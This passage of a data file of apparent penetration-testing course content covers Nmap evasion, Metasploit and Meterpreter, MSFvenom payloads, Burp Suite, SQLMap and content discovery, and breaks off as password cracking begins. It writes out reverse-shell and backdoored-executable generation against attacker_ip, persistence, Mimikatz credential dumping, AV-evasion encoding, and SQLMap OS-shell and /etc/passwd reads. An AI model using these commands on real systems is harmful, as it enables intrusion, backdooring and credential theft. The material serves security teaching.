          'Scanning all 65535 ports (-p-) provides complete coverage but takes significantly longer (minutes vs seconds for top 1000 ports) — prioritize full scans on high-value targets and use --top-ports for initial sweeps of large networks',
          'UDP scanning is essential (DNS, SNMP, TFTP, NTP run on UDP) but is extremely slow — a full 65535 UDP scan can take 18+ hours; focus on commonly exploitable UDP ports (53, 69, 111, 123, 161, 500, 514, 1900)',
        ],
        realWorld: [
          'Standard OSCP enumeration: "nmap -sC -sV -oA initial target_ip" for initial scan with default scripts and version detection, followed by "nmap -p- -oA allports target_ip" for complete port coverage',
          'Large network sweep: "nmap -sn -oG ping_sweep.gnmap 10.10.10.0/24 && grep Up ping_sweep.gnmap | awk \'{print $2}\' > live_hosts.txt" — discover live hosts first, then scan them individually for efficiency',
          'HTB/CTF methodology: always scan all ports because challenge creators frequently hide services on unusual ports (e.g., a web server on port 31337 or SSH on port 2222)',
          'Masscan as an Nmap complement: "masscan -p1-65535 --rate 1000 target_ip -oG masscan.gnmap" scans all ports in seconds using raw packet blasting, then Nmap is used for detailed service detection on discovered open ports',
        ],
      },
      {
        id: '5-2',
        name: 'Service & Version Detection with NSE Scripts',
        description:
          'Using Nmap\'s service detection (-sV) and the Nmap Scripting Engine (NSE) to identify software versions, detect vulnerabilities, and extract detailed information from discovered services.',
        keyPoints: [
          'Version detection (-sV): Nmap sends protocol-specific probes and matches responses against the nmap-service-probes database — identifies the specific software and version running on each port (e.g., "Apache httpd 2.4.49" or "OpenSSH 8.2p1")',
          'NSE default scripts (-sC or --script=default): runs a curated set of safe scripts that extract useful information — banner grabbing, SSL certificate details, HTTP title/methods, SMB OS discovery, and more without causing harm to the target',
          'Vulnerability scanning scripts: "nmap --script=vuln target" runs vulnerability detection scripts — includes checks for EternalBlue (smb-vuln-ms17-010), Heartbleed (ssl-heartbleed), ShellShock (http-shellshock), and hundreds more',
          'Targeted script usage: "nmap --script=http-enum,http-headers,http-methods -p 80,443 target" — run specific scripts against specific services for focused enumeration; NSE scripts are Lua-based and located in /usr/share/nmap/scripts/',
          'Script arguments: "nmap --script=smb-enum-shares --script-args smbusername=admin,smbpassword=pass target" — many scripts accept credentials or configuration arguments for authenticated enumeration',
        ],
        tradeoffs: [
          'Version detection (-sV) increases scan time significantly (sends multiple probes per port) but provides the information needed to search for known exploits — always use -sV on open ports discovered in the initial scan',
          'The --script=vuln category is noisy and can crash fragile services — run vulnerability scripts carefully on production systems and always get explicit authorization before using aggressive NSE categories (exploit, brute, dos)',
          'NSE scripts vary in quality and maintenance — some scripts are outdated or produce false positives; always verify NSE findings manually before reporting them as confirmed vulnerabilities',
        ],
        realWorld: [
          'The classic Nmap enumeration command: "nmap -sC -sV -p 22,80,443,445 -oA enum target_ip" — combines default scripts with version detection on common ports, producing the most useful output per time spent',
          'EternalBlue detection: "nmap --script=smb-vuln-ms17-010 -p 445 target" — this single script check has found countless vulnerable Windows machines in penetration tests since 2017',
          'Nmap NSE for web enumeration: "nmap --script=http-enum -p 80 target" discovers common directories and files (/admin, /phpmyadmin, /robots.txt, /.git) without needing a dedicated directory brute-forcing tool',
          'Custom NSE scripts: security researchers write custom NSE scripts for new vulnerabilities (Log4Shell, ProxyLogon) and share them on GitHub — the NSE framework makes Nmap extensible for any protocol or vulnerability check',
        ],
      },
      {
        id: '5-3',
        name: 'Scan Optimization & IDS Evasion (Timing, Fragmentation, Decoys)',
        description:
          'Techniques for optimizing Nmap scan speed and evading intrusion detection systems — including timing controls, packet fragmentation, source address spoofing, and decoy scanning.',
        keyPoints: [
          'Timing templates (-T0 through -T5): -T0 (paranoid, 5min between probes) and -T1 (sneaky) for IDS evasion, -T3 (normal, default), -T4 (aggressive, recommended for CTFs/labs), -T5 (insane, may miss results) — timing directly trades speed for stealth and accuracy',
          'Packet fragmentation (-f): splits probe packets into 8-byte fragments that must be reassembled by the target — some older IDS/firewalls fail to reassemble fragments and miss the scan; use -f -f for 16-byte fragments or --mtu to specify custom fragment sizes',
          'Decoy scanning (-D): "nmap -D RND:10 target" sends scan packets from 10 random spoofed IPs alongside your real IP — the target sees 11 different source addresses and cannot determine which is the real scanner; does not work with -sT (connect scan)',
          'Source port manipulation (--source-port 53): some firewalls allow traffic from "trusted" source ports (DNS/53, HTTP/80) — setting the Nmap source port to 53 can bypass poorly configured firewall rules that whitelist DNS traffic',
          'Output optimization: -oA (all formats), -oG (grepable), -oX (XML for tools), -oN (normal) — always use -oA to save results in all formats; grepable output enables command-line post-processing while XML feeds into other tools (searchsploit, Metasploit)',
        ],
        tradeoffs: [
          'Aggressive timing (-T4, -T5) risks missing open ports due to dropped packets and timeout issues — on unreliable networks or heavily firewalled targets, -T3 or slower provides more accurate results at the cost of time',
          'IDS evasion techniques (fragmentation, decoys, slow timing) add complexity and time — in CTF/lab environments these are unnecessary overhead; use them only when stealth is an engagement requirement',
          'Decoy scanning generates significant network traffic (each probe is multiplied by the number of decoys) and the spoofed IPs may trigger alerts at the decoy addresses — use decoys judiciously and never against targets you do not have authorization to scan',
        ],
        realWorld: [
          'OSCP recommendation: use -T4 for all lab and exam scanning — the time constraint makes speed essential, and there is no IDS to evade in the exam environment',
          'Real-world penetration test: start with -T2 during daytime hours when the SOC is actively monitoring, then increase to -T4 during off-hours when alert fatigue is higher — adapt timing to the engagement context',
          'Nmap output integration: "searchsploit --nmap output.xml" directly parses Nmap XML output and finds matching exploits in the Exploit-DB database — automating the enumeration-to-exploitation pipeline',
          'Large enterprise scans: "nmap -sS -T4 --min-rate 1000 -p- -oA full_scan target_range" with --min-rate ensures the scan maintains speed even on large networks; results are imported into tools like Sparta/Legion for collaborative analysis',
        ],
      },
    ],
  },
  {
    id: 6,
    title: 'Vulnerability Assessment',
    part: 2,
    partTitle: 'Reconnaissance & Scanning',
    summary:
      'Using automated vulnerability scanners in Kali to identify security weaknesses — from full-featured frameworks like OpenVAS/GVM to specialized web scanners like Nikto and Nuclei — and managing the inevitable false positives.',
    concepts: [
      {
        id: '6-1',
        name: 'OpenVAS/GVM Vulnerability Scanner',
        description:
          'The Greenbone Vulnerability Management (GVM) framework, formerly OpenVAS — a comprehensive open-source vulnerability scanner that performs network-based vulnerability assessments using a database of over 100,000 Network Vulnerability Tests (NVTs).',
        keyPoints: [
          'Installation and setup: "sudo apt install gvm && sudo gvm-setup" — the setup process downloads NVT feeds (100,000+ vulnerability checks), configures the PostgreSQL database, and creates an admin account; initial setup takes 30-60 minutes',
          'Architecture: GVM consists of the Scanner (ospd-openvas), Manager (gvmd), and Web Interface (gsad) — the scanner executes NVTs against targets, the manager orchestrates scans and stores results, and the web interface provides reporting and configuration',
          'Scan configurations: Full and Fast (recommended for most assessments), Full and Deep (more thorough but slower and more intrusive), Host Discovery, System Discovery — each configuration defines which NVTs to run and how aggressively to probe targets',
          'Credentialed scanning: providing SSH or SMB credentials enables GVM to log into targets and check installed software versions, patch levels, and configuration settings — credentialed scans find 3-10x more vulnerabilities than unauthenticated scans',
          'Reporting: GVM generates detailed reports in multiple formats (PDF, HTML, CSV, XML) with CVSS scores, CVE references, affected hosts, and remediation guidance — reports can be filtered by severity, host, or vulnerability type',
        ],
        tradeoffs: [
          'GVM is the most comprehensive free vulnerability scanner but is resource-intensive (needs 4GB+ RAM, significant disk space for NVT database) and has a complex setup — Nessus Essentials (free for 16 IPs) is easier to set up but is proprietary and limited',
          'Automated vulnerability scanners find known CVEs effectively but miss logic flaws, misconfigurations unique to the environment, and zero-day vulnerabilities — they complement but do not replace manual penetration testing',
          'Credentialed scans provide dramatically better results but require the tester to have valid credentials — in a black-box penetration test, initial exploitation may be needed before credentialed scanning becomes possible',
        ],
        realWorld: [
          'Penetration testing firms use GVM/OpenVAS for the automated vulnerability scanning phase of assessments — findings are verified manually, and false positives are removed before inclusion in the final report',
          'Compliance frameworks (PCI-DSS, HIPAA, SOC 2) require regular vulnerability scanning — GVM reports can satisfy these requirements when combined with evidence of remediation and rescan verification',
          'Bug bounty context: automated scanners are generally discouraged against production targets in bug bounty programs because they generate excessive traffic and noise — use targeted tools instead',
          'GVM vs Nessus: in professional penetration testing, Nessus Professional ($3,590/year) is the industry standard for vulnerability scanning, but GVM provides comparable capabilities for free and is the default in Kali Linux',
        ],
      },
      {
        id: '6-2',
        name: 'Web Vulnerability Scanners (Nikto, WPScan, Nuclei)',
        description:
          'Specialized web application vulnerability scanners that check for known vulnerabilities, misconfigurations, and dangerous default settings in web servers, CMS platforms, and web applications.',
        keyPoints: [
          'Nikto: "nikto -h https://target.com" — a comprehensive web server scanner that checks for 7,000+ dangerous files/programs, outdated server versions, and server configuration issues; noisy and easily detected but thorough for known web server vulnerabilities',
          'WPScan: "wpscan --url https://target.com/blog --enumerate vp,vt,u" — WordPress-specific scanner that enumerates vulnerable plugins (vp), vulnerable themes (vt), and users (u); uses the WPVulnDB API for up-to-date vulnerability data (free API key for 25 requests/day)',
          'Nuclei: "nuclei -u https://target.com -t cves/ -t misconfigurations/ -t exposures/" — template-based vulnerability scanner with 8,000+ community-contributed YAML templates; fast, accurate, and the go-to tool for modern bug bounty and penetration testing',
          'Template customization: Nuclei templates are simple YAML files defining HTTP requests and matchers — testers write custom templates for client-specific applications or newly disclosed vulnerabilities in minutes',
          'Scanning at scale: "cat urls.txt | nuclei -t nuclei-templates/ -c 50 -rl 150" — Nuclei excels at scanning thousands of URLs with rate limiting (-rl) and concurrency control (-c), making it ideal for large-scope engagements',
        ],
        tradeoffs: [
          'Nikto is comprehensive but extremely noisy — every request is logged, and the scanner generates hundreds of requests per target; not suitable for stealthy assessments but valuable for thorough automated checks in authorized tests',
          'WPScan requires an API key for vulnerability data and is limited to WordPress — but since WordPress powers 40%+ of the web, it is an essential specialized tool that finds vulnerabilities generic scanners miss',
          'Nuclei is the most modern and flexible option but its effectiveness depends entirely on template quality — always update templates ("nuclei -update-templates") and understand that templates only detect what they are written to detect',
        ],
        realWorld: [
          'Bug bounty workflow: "subfinder -d target.com | httpx -silent | nuclei -t cves/ -t exposures/ -t misconfigurations/" — this three-command pipeline discovers subdomains, filters for live web servers, and scans for known vulnerabilities automatically',
          'WPScan has found critical vulnerabilities in major WordPress installations: vulnerable plugins (Elementor, WooCommerce, Contact Form 7) account for the vast majority of WordPress compromises — WPScan checks all installed plugins against the vulnerability database',
          'ProjectDiscovery (Nuclei creators) maintains the largest open-source vulnerability template repository — new CVE templates are typically available within 24-48 hours of public disclosure, enabling rapid scanning for emerging threats',
          'Penetration test workflow: run Nikto for web server checks, WPScan if WordPress is detected, and Nuclei for comprehensive CVE and misconfiguration scanning — combine results to build the web vulnerability section of the assessment report',
        ],
      },
      {
        id: '6-3',
        name: 'Scan Analysis & False Positive Management',
        description:
          'The critical skill of analyzing automated scanner output, verifying findings, eliminating false positives, and prioritizing vulnerabilities for exploitation or reporting — separating signal from noise in vulnerability assessment.',
        keyPoints: [
          'False positive identification: verify every scanner finding before reporting — connect to the service manually (curl, browser, netcat), check the actual version string, and attempt to confirm the vulnerability with a proof of concept; unverified scanner output is not a penetration test report',
          'CVSS score interpretation: understand that CVSS Base scores do not account for environmental factors — a CVSS 9.8 remote code execution vulnerability behind a firewall with no internet exposure is lower risk than a CVSS 5.0 information disclosure on a public-facing login page',
          'Prioritization framework: rank findings by (1) exploitability (is there a public exploit?), (2) impact (what does successful exploitation achieve?), (3) exposure (internet-facing vs internal), and (4) business context (what data/systems are at risk?)',
          'Result correlation: cross-reference findings from multiple scanners — a vulnerability flagged by both Nmap NSE and Nuclei is more likely to be a true positive than one flagged by a single tool; correlate with manual testing for highest confidence',
          'Documentation: for each confirmed vulnerability, document the tool that found it, manual verification steps, evidence (screenshots, request/response pairs, command output), CVSS score, affected systems, and recommended remediation — this is the core of a penetration test report',
        ],
        tradeoffs: [
          'Manual verification of every finding is time-consuming but essential for report quality — clients lose trust in testers who deliver reports full of unverified scanner output; prioritize manual verification for high and critical findings',
          'Automated scanners provide breadth (checking thousands of vulnerabilities) while manual testing provides depth (finding logic flaws, chaining vulnerabilities) — a comprehensive assessment requires both automated and manual approaches',
          'Aggressive scanning finds more issues but risks crashing services, triggering lockouts, and disrupting business operations — always coordinate with the client and have a rollback plan for any testing against production systems',
        ],
        realWorld: [
          'A common penetration test failure: the tester runs Nessus/GVM, exports the PDF, and delivers it as the "penetration test report" — this is a vulnerability scan report, not a penetration test; professional testers verify, exploit, and demonstrate real-world impact',
          'CVSS contextual scoring: a SQL injection (CVSS 9.8) in a static marketing website with no database is a false positive, while a reflected XSS (CVSS 6.1) on a banking login page could enable session hijacking of high-value accounts — context determines true risk',
          'Vulnerability management platforms (DefectDojo, Faraday, PlexTrac) aggregate findings from multiple scanners, deduplicate results, track remediation status, and generate client-facing reports — essential for teams managing multiple concurrent engagements',
          'The "Scanning is not Testing" principle: PTES, OWASP, and CREST all emphasize that automated scanning is one phase of a penetration test methodology, not the entire test — scoping, manual testing, exploitation, and reporting are equally important phases',
        ],
      },
    ],
  },

  // Part 3: Exploitation & Attack Tools
  {
    id: 7,
    title: 'Metasploit Framework',
    part: 3,
    partTitle: 'Exploitation & Attack Tools',
    summary:
      'The Metasploit Framework — the most widely used exploitation framework in penetration testing — from basic module usage to advanced payload generation, Meterpreter post-exploitation, and MSFvenom encoding.',
    concepts: [
      {
        id: '7-1',
        name: 'MSFconsole & Module System (Exploits, Payloads, Auxiliary, Post)',
        description:
          'Navigating the Metasploit Framework through MSFconsole — understanding the module architecture, searching for exploits, configuring options, and executing attacks against vulnerable targets.',
        keyPoints: [
          'Module types: exploit (delivers a payload through a vulnerability), payload (code that runs after exploitation — reverse shell, meterpreter, command execution), auxiliary (scanning, fuzzing, DoS — no payload), post (post-exploitation modules for privilege escalation, pivoting, data collection), encoder (obfuscate payloads to evade AV)',
          'MSFconsole workflow: "search eternalblue" → "use exploit/windows/smb/ms17_010_eternalblue" → "show options" → "set RHOSTS target_ip" → "set LHOST attacker_ip" → "run" — this search-use-configure-execute pattern is consistent across all 4,000+ modules',
          'Payload selection: "show payloads" lists compatible payloads for the selected exploit — staged payloads (windows/meterpreter/reverse_tcp) use a small stager that downloads the full payload, while stageless payloads (windows/meterpreter_reverse_tcp, note the underscore) include everything in one package',
          'Database integration: "db_nmap -sV -sC target" runs Nmap and stores results in the Metasploit PostgreSQL database — "hosts", "services", and "vulns" commands query the database; "db_import nmap_scan.xml" imports external scan results',
          'Workspaces: "workspace -a engagement_name" creates isolated workspaces for different engagements — keeps hosts, services, credentials, and loot organized and prevents data cross-contamination between clients',
        ],
        tradeoffs: [
          'Metasploit makes exploitation accessible but can become a crutch — relying solely on Metasploit modules means you cannot exploit vulnerabilities that do not have a pre-built module; manual exploitation skills are essential for professional penetration testing',
          'Staged payloads are smaller (easier to deliver through size-limited exploits) but require a second network connection to download the full payload — stageless payloads are larger but more reliable in restricted network environments where outbound connections may be filtered',
          'The Metasploit database greatly improves organization but requires PostgreSQL to be running — "sudo msfdb init" sets up the database, and "msfdb status" verifies it is operational before starting msfconsole',
        ],
        realWorld: [
          'OSCP allows limited Metasploit use (one machine per exam) — students must learn manual exploitation for most targets but can leverage Metasploit strategically on the most complex machine',
          'EternalBlue exploitation in Metasploit: "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target; set LHOST attacker; run" — this single module exploits the vulnerability that powered the WannaCry ransomware attack and still finds unpatched machines in penetration tests today',
          'Metasploit Pro (commercial, $15,000+/year) adds a web GUI, automated exploitation, social engineering campaigns, and compliance reporting — used by large penetration testing firms for client-facing assessments',
          'Rapid7 maintains the Metasploit Framework as open-source (BSD license) with regular updates — new exploit modules are contributed by the community and Rapid7 researchers for newly disclosed CVEs',
        ],
      },
      {
        id: '7-2',
        name: 'Meterpreter & Post-Exploitation Modules',
        description:
          'The Meterpreter payload — Metasploit\'s advanced, in-memory post-exploitation agent — and the extensive library of post-exploitation modules for privilege escalation, credential harvesting, lateral movement, and persistence.',
        keyPoints: [
          'Meterpreter runs entirely in memory (never touches disk), communicates over encrypted channels (TLS), and provides a rich command set: sysinfo, getuid, getsystem, hashdump, screenshot, keyscan_start, webcam_snap, download/upload — all without dropping files to the target disk',
          'Privilege escalation: "getsystem" attempts multiple techniques (named pipe impersonation, token duplication) to escalate from user to SYSTEM on Windows; "run post/multi/recon/local_exploit_suggester" identifies kernel exploits applicable to the target',
          'Credential harvesting: "run post/windows/gather/hashdump" dumps SAM hashes, "load kiwi; creds_all" (Mimikatz integration) extracts plaintext passwords, NTLM hashes, and Kerberos tickets from memory — these credentials enable lateral movement across the network',
          'Pivoting: "run autoroute -s 10.10.10.0/24" routes traffic through the compromised host to reach internal networks; combined with "use auxiliary/server/socks_proxy" to create a SOCKS proxy, enabling any tool (Nmap, Burp Suite) to scan the internal network through the Meterpreter session',
          'Persistence: "run persistence -U -i 10 -p 4444 -r attacker_ip" (legacy) or "run post/windows/manage/persistence_exe" installs a backdoor that automatically reconnects to the attacker — essential for maintaining access during multi-day engagements but must be cleaned up after the test',
        ],
        tradeoffs: [
          'Meterpreter is extremely powerful but well-known to antivirus and EDR solutions — default Meterpreter payloads are detected by most modern AV; obfuscation, custom stagers, or alternative C2 frameworks (Cobalt Strike, Sliver, Havoc) are needed for AV evasion on hardened targets',
          'Pivoting through Meterpreter is convenient but adds latency and can be unstable over slow connections — dedicated pivoting tools (Chisel, Ligolo-ng) provide more reliable tunneling for sustained internal network access',
          'Persistence mechanisms leave artifacts (registry keys, scheduled tasks, startup items) that must be documented and removed after the engagement — failure to clean up persistence could leave the client network vulnerable to actual attackers',
        ],
        realWorld: [
          'Internal penetration test workflow: compromise one host via a web application vulnerability, deploy Meterpreter, use autoroute and SOCKS proxy to scan the internal network, harvest credentials with Kiwi/Mimikatz, and move laterally until domain admin is achieved',
          'Mimikatz through Meterpreter ("load kiwi; creds_all") is one of the most common techniques in real-world attacks — APT groups and ransomware operators use the same credential dumping techniques that penetration testers demonstrate in assessments',
          'The local_exploit_suggester module saves significant time during privilege escalation: it fingerprints the target OS, kernel version, and patch level, then recommends specific exploit modules likely to succeed — reducing trial-and-error exploitation',
          'HTB and OSCP machines frequently require Meterpreter pivoting: compromise the first machine, set up a route to the internal network, then scan and exploit a second machine that is only accessible through the first — testing the student\'s ability to chain attacks across network segments',
        ],
      },
      {
        id: '7-3',
        name: 'MSFvenom Payload Generation & Encoding',
        description:
          'Using MSFvenom to generate standalone payloads in various formats — executables, web shells, shellcode, and script payloads — with encoding and encryption to evade antivirus detection.',
        keyPoints: [
          'Basic payload generation: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o shell.exe" — creates a Windows executable that connects back to the attacker; -p (payload), -f (format), -o (output file)',
          'Format versatility: -f exe (Windows PE), -f elf (Linux ELF), -f raw (shellcode), -f python/c/ruby (language-specific shellcode), -f war (Java web archive), -f asp/aspx/jsp/php (web shells) — MSFvenom generates payloads for virtually any target platform and delivery mechanism',
          'Encoding for evasion: "msfvenom -p windows/meterpreter/reverse_tcp ... -e x86/shikata_ga_nai -i 5 -f exe" — encodes the payload 5 iterations with the polymorphic XOR encoder; combining multiple encoders: "-e x86/shikata_ga_nai -i 3 | msfvenom -e x86/alpha_mixed -i 2 -f exe"',
          'Embedding in legitimate files: "msfvenom -p windows/meterpreter/reverse_tcp ... -x putty.exe -k -f exe -o putty_backdoor.exe" — injects the payload into a legitimate executable (-x template, -k keep original functionality) for social engineering delivery',
          'Shellcode for exploit development: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f python -b \'\\x00\'" — generates shellcode in Python format with bad character avoidance (-b) for use in custom buffer overflow exploits',
        ],
        tradeoffs: [
          'MSFvenom payloads are well-known signatures to AV engines — even heavily encoded payloads are increasingly detected by behavioral analysis and ML-based AV; for real engagements, custom payload development or C2 frameworks with built-in evasion (Sliver, Havoc, Cobalt Strike) are more effective',
          'Shikata_ga_nai encoding was once effective but is now a detection signature itself — modern AV specifically looks for shikata_ga_nai decoding stubs; encoding alone is no longer sufficient for AV evasion on up-to-date Windows systems',
          'Staged payloads (-p windows/meterpreter/reverse_tcp) are smaller but require the handler to serve the second stage — stageless payloads (-p windows/meterpreter_reverse_tcp) are larger but self-contained and more reliable for delivery via USB, phishing attachments, or other offline methods',
        ],
        realWorld: [
          'OSCP buffer overflow: students use MSFvenom to generate shellcode ("msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... -b \'\\x00\\x0a\\x0d\' -f python") for custom buffer overflow exploits — understanding bad characters and shellcode generation is a core exam skill',
          'Social engineering assessments: embed a Meterpreter payload in a legitimate-looking document or application, deliver via phishing email, and demonstrate that employees will execute untrusted files — the payload generation is the technical component of the social engineering attack',
          'Web shell generation: "msfvenom -p php/meterpreter/reverse_tcp LHOST=... LPORT=... -f raw > shell.php" — used when a web application file upload vulnerability is found; the PHP shell is uploaded and accessed via the browser to trigger the reverse connection',
          'Modern AV evasion workflow: generate raw shellcode with MSFvenom, then wrap it in a custom loader written in C/Go/Rust/Nim that implements sleep obfuscation, syscall unhooking, and in-memory execution — MSFvenom provides the payload, custom code provides the evasion',
        ],
      },
    ],
  },
  {
    id: 8,
    title: 'Web Application Testing',
    part: 3,
    partTitle: 'Exploitation & Attack Tools',
    summary:
      'Core web application security testing tools in Kali — intercepting and manipulating HTTP traffic with Burp Suite, automating SQL injection with SQLMap, and discovering hidden content with directory brute-forcing tools.',
    concepts: [
      {
        id: '8-1',
        name: 'Burp Suite (Proxy, Scanner, Intruder, Repeater)',
        description:
          'Burp Suite — the industry-standard web application security testing platform — used to intercept, inspect, modify, and replay HTTP/HTTPS traffic between the browser and the target application.',
        keyPoints: [
          'Proxy: configure the browser to route traffic through Burp (127.0.0.1:8080) — every request and response is captured in the HTTP History tab; intercept mode allows modifying requests before they reach the server (changing parameters, headers, cookies, request methods)',
          'Repeater: send any captured request to Repeater for manual modification and resending — the primary tool for testing individual parameters: modify a value, send, analyze the response, iterate; essential for testing injection flaws, authentication bypasses, and business logic vulnerabilities',
          'Intruder: automated attack tool for fuzzing parameters — configure attack positions (marked with section signs), load payload lists (SecLists wordlists, custom lists), and launch attacks to brute-force credentials, enumerate valid IDs, or test for injection vulnerabilities across many values',
          'Scanner (Professional only): automated web vulnerability scanner that crawls the application and tests for OWASP Top 10 vulnerabilities — passive scanning runs on all proxied traffic, active scanning sends additional payloads to test for XSS, SQLi, SSRF, command injection, and more',
          'Extensions: BApp Store provides community extensions — Autorize (authorization testing), JWT Editor (JSON Web Token manipulation), Logger++ (advanced logging), Turbo Intruder (Python-scripted fast fuzzing), Upload Scanner (file upload testing) — extend Burp for specialized testing needs',
        ],
        tradeoffs: [
          'Burp Suite Community Edition is free but lacks the automated scanner, rate-unlimited Intruder, and several advanced features — Professional ($449/user/year) is a necessary investment for professional web application testing',
          'Intercepting HTTPS requires installing the Burp CA certificate in the browser — this decrypts all traffic through Burp, so never use it on a machine that also handles personal or sensitive non-engagement traffic',
          'Burp Suite is Java-based and can be memory-intensive (2-4GB+ for large assessments) — configure JVM memory settings and use scope filtering to limit what Burp captures, especially during long engagements with heavy traffic',
        ],
        realWorld: [
          'Every web application penetration test begins with configuring Burp Suite as the proxy — the tester manually browses the application while Burp captures the sitemap, identifies parameters, and builds a comprehensive model of the application',
          'Burp Repeater is where most vulnerabilities are actually found: the tester captures a request, identifies an interesting parameter, and iteratively modifies it to test for SQL injection, XSS, IDOR, authentication bypass, and other vulnerabilities',
          'Bug bounty hunters use Burp Suite Professional as their primary tool — the automated scanner finds low-hanging fruit, while Repeater and custom extensions enable deep manual testing of complex application logic',
          'OWASP ZAP (Zed Attack Proxy) is the free, open-source alternative to Burp Suite — it is pre-installed in Kali and provides similar proxy/scanner/fuzzer functionality, making it a viable option for testers on a budget or for learning',
        ],
      },
      {
        id: '8-2',
        name: 'SQL Injection with SQLMap',
        description:
          'SQLMap — the premier automated SQL injection detection and exploitation tool — capable of detecting, exploiting, and extracting data from SQL injection vulnerabilities across all major database systems.',
        keyPoints: [
          'Basic usage: "sqlmap -u \'https://target.com/page?id=1\' --dbs" — tests the id parameter for SQL injection and enumerates databases if vulnerable; SQLMap automatically detects the DBMS type (MySQL, MSSQL, PostgreSQL, Oracle, SQLite) and adjusts payloads accordingly',
          'Request from Burp: "sqlmap -r request.txt --level 3 --risk 2" — save a request from Burp Suite to a file, and SQLMap tests all parameters; --level (1-5) controls testing depth and --risk (1-3) controls payload aggressiveness (higher risk may modify data)',
          'Data extraction: --dbs (list databases), -D dbname --tables (list tables), -D dbname -T users --dump (dump table contents), --dump-all (dump everything) — SQLMap handles UNION, boolean blind, time-based blind, error-based, and stacked queries injection techniques automatically',
          'OS-level access: --os-shell (interactive OS command shell via SQL injection), --os-pwn (Meterpreter/VNC through SQL injection), --file-read /etc/passwd (read server files), --file-write shell.php --file-dest /var/www/html/ (write files) — escalating from SQL injection to full system compromise',
          'Advanced features: --tamper (use tamper scripts to bypass WAFs), --tor (route through Tor), --threads 10 (parallel requests), --batch (non-interactive, accept defaults), --forms (automatically test HTML forms on a page)',
        ],
        tradeoffs: [
          'SQLMap is extremely thorough but very noisy — it sends hundreds to thousands of requests testing each parameter, making it easily detectable by WAFs and logging systems; for stealthy testing, use Burp Repeater to manually craft SQL injection payloads',
          'Automated tools like SQLMap can confirm and exploit known injection patterns but may miss second-order SQL injection, complex multi-step injection chains, or injection points in unusual locations (HTTP headers, JSON bodies, XML parameters)',
          '--os-shell and --os-pwn attempt to write files to the web root or use xp_cmdshell — these are destructive techniques that require explicit authorization and should never be used without client approval and an understanding of the potential impact',
        ],
        realWorld: [
          'Penetration test workflow: identify a potential injection point in Burp Suite (unusual error messages, parameter reflection), save the request to a file, run "sqlmap -r request.txt --batch --dbs" to confirm and exploit — SQLMap handles the technical complexity of exploitation while the tester focuses on finding injection points',
          'WAF bypass: "sqlmap -u \'target.com?id=1\' --tamper=space2comment,between,randomcase" — tamper scripts modify payloads to bypass common WAF rules; the space2comment script replaces spaces with /**/ comments, between uses BETWEEN instead of comparison operators',
          'SQLMap + Burp integration: the SQLMap module in Burp (or the CO2 extension) allows sending requests directly from Burp to SQLMap, streamlining the testing workflow',
          'Real-world SQL injection remains one of the most critical web vulnerabilities — the OWASP Top 10 consistently ranks injection flaws as a top risk, and SQLMap is the primary tool used by both penetration testers and malicious actors to exploit them',
        ],
      },
      {
        id: '8-3',
        name: 'Directory & Content Discovery (Gobuster, ffuf, Dirb, Feroxbuster)',
        description:
          'Brute-forcing web application directories, files, and virtual hosts to discover hidden content, backup files, admin panels, and API endpoints that are not linked in the application but accessible on the server.',
        keyPoints: [
          'Gobuster: "gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50" — fast Go-based directory brute-forcer; -w (wordlist), -x (file extensions to append), -t (threads); also supports dns, vhost, and s3 enumeration modes',
          'ffuf (Fuzz Faster U Fool): "ffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404 -t 100" — the most flexible fuzzer; FUZZ keyword can be placed anywhere in the URL, headers, or POST body; -fc (filter response code), -fs (filter size), -fw (filter word count) for precise result filtering',
          'Feroxbuster: "feroxbuster -u https://target.com -w wordlist.txt -x php -d 2 -t 50" — Rust-based recursive directory brute-forcer; -d (recursion depth) automatically discovers nested directories; faster and more feature-rich than gobuster with built-in recursion, auto-calibration, and regex filtering',
          'Wordlist selection: /usr/share/wordlists/ contains essential lists — SecLists (Daniel Miessler\'s comprehensive collection), dirbuster wordlists, dirb wordlists, rockyou.txt; "apt install seclists" installs the industry-standard wordlist collection; target-specific custom wordlists dramatically improve results',
          'Virtual host discovery: "ffuf -u https://target.com -H \'Host: FUZZ.target.com\' -w subdomains.txt -fc 404 -fs 0" — discovers virtual hosts (dev.target.com, staging.target.com, admin.target.com) that resolve to the same IP but serve different content based on the Host header',
        ],
        tradeoffs: [
          'Aggressive brute-forcing (high thread count, large wordlists) finds more content but can overwhelm web servers, trigger WAF blocks, and cause denial of service — respect rate limits and start with moderate settings, especially against production systems',
          'Larger wordlists provide better coverage but take exponentially longer — the SecLists directory-list-2.3-medium.txt (220,000 entries) is a good default; use big.txt or raft-large for thorough assessments when time permits',
          'Directory brute-forcing only finds predictable paths — custom application routes, randomized URLs, and dynamically generated paths require other techniques (JavaScript analysis, API documentation discovery, application crawling)',
        ],
        realWorld: [
          'Common critical findings: /admin, /.git (source code disclosure), /backup, /.env (environment variables with credentials), /api/swagger (API documentation), /server-status (Apache status page), /wp-admin (WordPress admin) — these are found regularly in penetration tests',
          'OSCP enumeration: directory brute-forcing is a mandatory step for every web service — hidden directories frequently contain the initial foothold: an upload form, a vulnerable plugin, backup files with credentials, or an outdated admin panel',
          'Bug bounty approach: use ffuf to discover hidden API endpoints, then test each endpoint for IDOR, authentication bypass, and injection vulnerabilities — many critical bug bounty findings start with discovering an undocumented API endpoint',
          'Recursive directory discovery: feroxbuster finds /app/, then automatically brute-forces /app/admin/, /app/admin/backup/, etc. — this recursive approach discovers deeply nested content that a single-level scan would miss',
        ],
      },
    ],
  },
  {
    id: 9,
    title: 'Password Attacks',
    part: 3,
    partTitle: 'Exploitation & Attack Tools',
    summary:
      'Comprehensive password attack techniques — offline hash cracking with John the Ripper and Hashcat, online brute-force attacks with Hydra, and custom wordlist generation for targeted attacks.',
    concepts: [
      {
        id: '9-1',
        name: 'Offline Cracking (John the Ripper, Hashcat, Rules, Masks)',
        description:
          'Cracking password hashes offline using CPU-based (John the Ripper) and GPU-accelerated (Hashcat) tools — leveraging wordlists, rules, and mask attacks to recover plaintext passwords from captured hashes.',
        keyPoints: [
